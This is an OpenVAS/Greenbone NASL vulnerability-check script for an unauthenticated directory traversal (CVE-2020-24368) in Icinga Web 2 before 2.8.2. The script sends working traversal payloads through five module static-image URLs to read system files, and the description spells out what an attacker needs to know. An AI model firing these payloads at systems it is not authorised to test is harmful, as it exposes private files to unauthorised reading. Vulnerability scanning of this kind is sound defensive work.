# Copyright (C) 2020 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:icinga:icingaweb2";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.144432");
  script_version("2020-08-20T04:17:47+0000");
  script_tag(name:"last_modification", value:"2020-08-20 10:11:27 +0000 (Thu, 20 Aug 2020)");
  script_tag(name:"creation_date", value:"2020-08-20 03:46:03 +0000 (Thu, 20 Aug 2020)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2020-24368");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Icinga Web 2 < 2.8.2 Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2020 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("sw_icingaweb2_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("icingaweb2/installed");
  script_require_ports("Services/www", 80, 443);

  script_tag(name:"summary", value:"Icinga Web 2 is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability allows an attacker to access arbitrary files which are
  readable by the process running Icinga Web 2. (This is usually the web server or fpm process)

  To exploit this vulnerability the attacker has to acquire the following knowledge:

  - The URI at which Icinga Web 2 is accessible

  - An installed additional (non-core) module, which can be leveraged (known public modules are businessprocess,
    director, reporting, map and globe)

  - The module's install path

  A valid user login is NOT required.");

  script_tag(name:"impact", value:"An unauthenticated attacker may read arbitrary files.");

  script_tag(name:"affected", value:"Icinga Web 2 prior to version 2.8.2.");

  script_tag(name:"solution", value:"Update to version 2.8.2 or later.");

  script_xref(name:"URL", value:"https://github.com/Icinga/icingaweb2/issues/4226");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

if (dir == "/")
  dir = "";

files = traversal_files();

urls =  make_list("/static/img?module_name=businessprocess&file=",
                 "/static/img?module_name=director&file=",
                 "/static/img?module_name=reporting&file=",
                 "/static/img?module_name=map&file=",
                 "/static/img?module_name=globe&file=");

foreach url (urls) {
  foreach pattern (keys(files)) {
    payload = dir + url + crap(length: 7*3, data: "../") + files[pattern];
    if (http_vuln_check(port: port, url: payload, pattern: pattern, check_header: TRUE)) {
      report = http_report_vuln_url(port: port, url: payload);
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(0);
